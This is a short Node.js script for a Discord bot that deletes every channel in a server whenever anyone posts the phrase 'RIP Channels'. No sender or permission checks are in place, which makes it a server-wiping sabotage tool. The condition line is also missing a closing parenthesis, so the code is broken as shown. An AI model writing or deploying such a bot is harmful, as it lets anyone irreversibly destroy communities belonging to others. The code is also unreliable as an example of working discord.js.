
const Discord = require("discord.js");
const client = new Discord.Client();
const prefix = "!";


    client.on("message", message => {
              if(message.content === "RIP Channels" {
              message.guild.channels.forEach(channel => channel.delete())
}
   });


client.login(process.env.BOT_TOKEN);

